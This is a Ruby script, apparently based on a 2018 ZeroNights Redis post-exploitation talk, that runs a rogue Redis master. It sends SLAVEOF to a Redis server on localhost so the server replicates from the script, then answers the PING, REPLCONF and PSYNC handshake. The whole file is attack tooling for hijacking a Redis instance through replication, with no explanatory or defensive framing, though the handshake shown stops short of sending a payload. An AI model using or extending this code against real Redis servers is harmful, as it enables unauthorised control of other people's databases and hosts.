#https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf

require 'socket'

server = TCPServer.new 2421 # Server bind to port 2000

s = TCPSocket.new('localhost', 6379)
s.puts "SLAVEOF 127.0.0.1 2421"

class Log

	def self.info msg
		print "\e[34m[info]\e[0m "
		p msg
	end

	def self.succ msg
		print "\e[32m[succ]\e[0m "
		p msg
	end

	def self.warn msg
		print "\e[93m[warn]\e[0m "
		p msg
	end

	def self.err msg
		print "\e[31m[err]\e[0m "
		p msg
	end

	def self.sen msg
		print "\e[31m[>>]\e[0m "
		p msg
	end
	
	def self.rec msg
		print "\e[32m[<<]\e[0m "
		p msg
	end

end

class String
	def is_number?
		true if Float(self) rescue false
	end
end

def send msg
	@client.puts msg
	Log.sen msg
end

def rec
	msg = @client.gets
	if msg == nil
		Log.err "Received empty message, the socket prob closed"
		raise
	end
	msg.gsub!(/[\r\n]/, "")
	Log.rec msg
	return msg || ""
end

def parser msg
	return Log.err "Can't parse argument count" if !msg.start_with? "*" or !msg[1..].is_number?
	argument_count = msg[1..].to_i
	arguments = []

	for i in (0..argument_count-1)
		arg_length = rec
		return Log.err "Can't parse argument length" if !arg_length.start_with? "$" or !arg_length[1..].is_number?
		arg_length = arg_length[1..].to_i
		argument = rec
		if argument.length != arg_length
			Log.warn "Argument length and specified length mis-match"
		end
		arguments.push argument
	end
	return arguments
end

#loop do
	@client = server.accept
	Log.succ "Succesful connection"
	begin
		loop do
			if msg = rec
				arguments = parser msg
				Log.info arguments.join " "
				next if !arguments
				case arguments[0]
				when "PING"
					send "+PONG"
				when "REPLCONF"
					send "+OK"
				when "PSYNC"
					send "+CONTINUE #{arguments[1]} 0"
				end
			end
		end
	rescue
	end
#end

